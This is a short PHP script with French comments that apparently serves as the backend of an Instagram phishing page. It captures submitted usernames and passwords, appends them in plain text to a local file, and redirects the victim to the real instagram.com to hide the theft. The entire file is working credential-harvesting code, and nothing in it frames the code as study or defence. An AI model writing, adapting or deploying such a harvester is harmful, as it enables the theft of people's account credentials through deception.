<?php
$username = $_POST['username']; 
$password = $_POST['password'];
# Chemin vers fichier texte
$file ="test.txt";
# Ouverture en mode écriture
$fileopen=(fopen("$file",'a'));
# Ecriture de "Début du fichier" dansle fichier texte
fwrite($fileopen,'' .$username. ' / ' .$password.'    ');
# On ferme le fichier proprement
fclose($fileopen);
header("Location: https://www.instagram.com")
?>